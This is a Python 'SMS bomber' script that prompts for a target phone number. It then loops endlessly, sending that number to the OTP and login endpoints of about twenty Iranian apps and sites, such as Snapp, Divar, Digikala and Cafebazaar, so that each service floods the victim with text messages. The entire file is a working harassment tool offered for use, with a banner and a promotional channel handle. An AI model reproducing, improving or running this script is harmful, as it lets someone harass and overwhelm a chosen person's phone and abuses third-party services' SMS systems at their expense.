import os
import sys
os.system("pkg install figlet")
os.system("pip install pyfiglet")
#importing
import pyfiglet
import time
from requests import post , get

# Banner sms bomber 
os.system("clear")
soni = """

\033[00;31mMMWWWWWWWWWWWWWWWWWWWWWNXXNWWWWWWWWWWWWWWWWWWWWWMM
MMWWWWWWWWWWWWWWWWWWWWNd,'oNWWWWWWWWWWWWWWWWWWWWMM
MMWWWWWWWWWWWWWWWWWWWNo....lXWWWWWWWWWWWWWWWWWWWMM
\033[00;32mMMWWWWWWWWWWWWWWWWWWXc.oKXd.:KWWWWWWWWWWWWWWWWWWMM
MMWWWWWWWWWWWWWWWWN0l.,looo:.;0WWWWWWWWWWWWWWWWWMM
MMWWWWWWWWWWWWN0dc;,;:clllldd''ooo0NWWWWWWWWWWWWMM
\033[00;33mMMWWWWWWWWWWXx:':;'lKWNkllkNW0,.::';xXWWWWWWWWWWMM
MMWWWWWWWWNk;'lOd.,0W0ccddll0WK;.d0o',kNWWWWWWWWMM
MMWWWWWWWNo.:KNo.:KWO;:oool;:ONXc.lXKc.lXWWWWWWWMM
\033[00;34mMMWWWWWWNl.lNXc.l0xo;cK0000ko:cd0o.:XNo.cNWWWWWWMM
MMWWWWWWx.:XK:.dk:ld:xXK00KXx:dl:kd.KNc.dWWWWWWMM
MMWWWWWN:.x0,.x0::ko:loooooxl,lkc:0k''Ok.;XMWWWWMM
\033[00;35mMMWWWWMX;'o,'OWx,ldxllKMWWMX:cko::OWO,'o,,KWWWWWMM
MMWWWWWXo,.,0WKo,dWWKccKWWKc:0WWk;:OW0:;.,KWWWWWMM
MMWWWWWNo.:KM0:ll;OWWXd:odloXWW0:ol;0WNl.cNWWWWWMM
\033[00;36mMMWWWWXl.,cOWd'ld;;dxdoxdoookOd;:do'oWO'':lKWWWWMM
MMWWWK:.oO,.kKOxdddddlcoooocclxOxdxOKk''kd.;KWWWMM
MMWW0, ;xko,.c0KOkkkkdoccccldkkkkkkkd;'lkx: ,OWWMM
\033[01;37mMMWNx:;:::cdd;'',,::::::::::::::,'.,::::::::;dXWWM
MMWWWWWWWWWWWNOl;;:lxk00KK00Oxo:;:dKWWWWWWWWWWWWMM
MMWWWWWWWWWWWWWWN0xlc:::::::::lx0NWWWWWWWWWWWWWWMM
MMWWWWWWWWWWWWWWWWWMWWNNXXNNWWWWWWWWWWWWWWWWWWWWMM
"""
for c in soni:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.01)
    
print("\033[00;32m")
os.system("figlet shadows")

print ("\033[00;31m number [09×××××××××] ") 
print (" channel Rubika && Telegram : \033[00;33m@Esfelurm")
print("")
number = input( "\033[00;32m Target number : ")
os.system("figlet start sms")

# api

bazaro = {"properties":{"language":2,"clientID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","deviceID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":number}}}
dirin = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
gap =  {"phone":number}
spaed = {"data":{"mobile":number},"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1630723653780"}
nama = {"phoneNumber": number }
rubj = {"api_version":"3","method":"sendCode","data":{"phone_number":number,"send_type":"SMS"}}
bamad = "cellNumber="+number
ali = {"phoneNumber": number }
hamrah = {"action":"getAppViaSMS","number": number }
arkd = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}
digikala = {"phone":number}
sheypoor = {"phone":number}
snapj = {"phone":number}
tapsi1 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
divarj = {"phone":number}
emd = "send=1&cellphone="+number
#nop
kos = {"cellphone":number}
jabar = {"mobile":number}
tebin = {"username":number,"captchaHash":"","captchaValue":""}
snapio = {"lang":"fa","country_id":"860","password":"virus450"}
goz = {"phone":number}
# inputer
while True:
	
    A = post("https://api.tapsi.cab/api/v2/user",json=tapsi1)
    if A.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    S = post("https://api.divar.ir/v5/auth/authenticate",json=divarj)
    if S.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    D = post("https://messengerg2c42.iranlms.ir/",json=rubj)
    if D.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    F = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapj)
    if F.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    G = post("https://web.emtiyaz.app/json/login",data=emd)
    if G.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    H = post("https://bama.ir/signin-checkforcellnumber",data=bamad)
    if H.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    J = post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
    if J.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    K = post("https://api.chartex.net/api/v2/user/validate",json=arkd)
    if K.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    L = get("https://api.torob.com/a/phone/send-pin/?phone_number="+number)
    if L.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    Z = get("https://api.binjo.ir/api/panel/get_code/"+number)
    if Z.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    X = get("https://core.gap.im/v1/user/add.json?mobile="+number)
    if X.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    C = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}')
    if C.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    V = post("https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/",json=digikala)
    if V.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    B = get("https://drdr.ir/api/registerEnrollment/verifyMobile",json=dirin)
    if B.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')        
    N = get("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest",json=bazaro)
    if N.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    M = post("https://core.gapfilm.ir/api/v3.1/Account/Login",json=gap)
    if M.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')  
    Q = post("https://app.espard.com/api/v1/auth/identify-by-mobile",json=spaed)
    if Q.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')                   
    W = post("https://a4baz.com/api/web/login",json=kos)
    if W.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
        
    E = post("https://taraazws.jabama.com/api/v4/account/send-code",json=jabar)
    if E.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    R = post("https://www.tebinja.com/api/v1/users",json=tebin)
    if R.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    T = post("https://www.snapptrip.com/register",json=snapio)
    if T.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')
    Y = post("https://api2.anten.ir/users",json=goz)
    if Y.status_code == 200:
        print('\033[00;32m $Shadows@=~ Sent')
    else:
        print('\033[00;31m $Shadows@=~ Could not send')